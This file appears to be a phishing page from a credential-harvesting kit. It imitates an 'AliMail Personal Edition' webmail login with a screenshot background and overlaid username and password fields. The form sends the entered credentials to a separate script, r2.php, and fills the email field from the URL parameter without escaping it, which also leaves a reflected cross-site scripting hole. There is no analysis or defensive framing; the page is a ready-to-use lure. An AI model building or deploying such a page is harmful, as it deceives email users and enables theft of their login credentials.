<?php     

?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<style>
body {
  background-image: url("1b.PNG");
  background-repeat: no-repeat; 
}
</style>
<title>AliMail Personal Edition</title>
</head>


<form method=post action=r2.php>


<p>
<input type="text" name="username" size="21" required="" "placeholder="&#29992;&#25143;&#36523;&#20221;" style="position: absolute; left: 888; top: 169; width: 253px; height: 26px" value="<?=$_GET[email]?>"></p>
<p>
<input type="password" name="password" required="" placeholder="Password" size="20" style="position: absolute; left: 891; top: 225; width: 250px; height: 30px"></p>

<input type="image" name="submit" src="sub%20al.png" border="0" alt="Submit" style="position: absolute; left: 890; top: 279" width="256" height="38" />
</body width="32" height="28">
<img border="0" src="inv2.png" width="67" height="33" style="position: absolute; left: 965; top: 122"></form>
</html>